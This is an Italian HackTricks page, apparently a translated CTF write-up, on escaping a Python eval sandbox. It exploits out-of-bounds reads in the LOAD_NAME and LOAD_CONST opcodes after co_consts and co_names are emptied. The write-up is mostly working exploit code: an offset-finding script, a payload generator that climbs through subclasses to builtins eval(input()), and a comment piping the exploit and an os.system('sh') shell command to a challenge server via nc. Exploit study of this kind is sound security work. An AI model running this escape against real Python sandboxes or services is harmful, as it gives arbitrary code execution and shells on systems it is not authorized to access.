# LOAD_NAME / LOAD_CONST opcode OOB Read

{% hint style="success" %}
Impara e pratica l'hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}

**Questa informazione è stata presa** [**da questo articolo**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Possiamo utilizzare la funzionalità di lettura OOB nell'opcode LOAD_NAME / LOAD_CONST per ottenere alcuni simboli in memoria. Ciò significa utilizzare trucchi come `(a, b, c, ... centinaia di simboli ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come ad esempio il nome di una funzione) desiderato.

Poi basta creare il proprio exploit.

### Panoramica <a href="#overview-1" id="overview-1"></a>

Il codice sorgente è piuttosto breve, contiene solo 4 righe!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Puoi inserire del codice Python arbitrario e verrà compilato in un [oggetto codice Python](https://docs.python.org/3/c-api/code.html). Tuttavia, `co_consts` e `co_names` di quell'oggetto codice verranno sostituiti con una tupla vuota prima di valutare quell'oggetto codice.

Quindi, in questo modo, tutte le espressioni che contengono costanti (ad es. numeri, stringhe, ecc.) o nomi (ad es. variabili, funzioni) potrebbero causare un errore di segmentazione alla fine.

### Lettura fuori limite <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Come avviene il segmentation fault?

Iniziamo con un esempio semplice, `[a, b, c]` potrebbe essere compilato nel bytecode seguente.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ma cosa succede se `co_names` diventa una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e cerca di leggere il valore da quell'indirizzo di memoria inizialmente previsto. Sì, questa è una "caratteristica" di lettura out-of-bound.

Il concetto principale per la soluzione è semplice. Alcuni opcode in CPython come `LOAD_NAME` e `LOAD_CONST` sono vulnerabili (?) alla lettura OOB.

Recuperano un oggetto dall'indice `oparg` dalla tupla `consts` o `names` (che è come sono chiamati sotto il cofano `co_consts` e `co_names`). Possiamo fare riferimento al breve snippet seguente su `LOAD_CONST` per vedere cosa fa CPython quando elabora l'opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
In questo modo possiamo utilizzare la funzionalità OOB per ottenere un "nome" da un offset di memoria arbitrario. Per assicurarci di quale nome si tratti e qual è il suo offset, basta provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potresti trovare qualcosa intorno a oparg > 700. Puoi anche provare ad utilizzare gdb per dare un'occhiata alla struttura della memoria ovviamente, ma non penso che sarebbe più facile?

### Generazione dell'Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una volta che abbiamo recuperato quegli utili offset per i nomi / costanti, come _possiamo_ ottenere un nome / costante da quell'offset e utilizzarlo? Ecco un trucco per te:\
Supponiamo di poter ottenere un nome `__getattribute__` dall'offset 5 (`LOAD_NAME 5`) con `co_names=()`, allora basta fare le seguenti operazioni:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Notare che non è necessario chiamarlo `__getattribute__`, puoi chiamarlo con un nome più corto o strano

Puoi capire il motivo semplicemente visualizzando il bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Si noti che `LOAD_ATTR` recupera anche il nome da `co_names`. Python carica i nomi dalla stessa posizione se il nome è lo stesso, quindi il secondo `__getattribute__` viene comunque caricato dalla posizione=5. Utilizzando questa caratteristica possiamo utilizzare un nome arbitrario una volta che il nome è in memoria nelle vicinanze.

Per generare numeri dovrebbe essere banale:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Script di exploit <a href="#exploit-script-1" id="exploit-script-1"></a>

Non ho utilizzato costanti a causa del limite di lunghezza.

Ecco prima uno script per trovare quelle posizioni dei nomi.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
E il seguente è per generare l'effettivo exploit Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Si limita fondamentalmente a fare le seguenti cose, per le stringhe che otteniamo dal metodo `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Impara e pratica l'hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) nei repository di github.

</details>
{% endhint %}
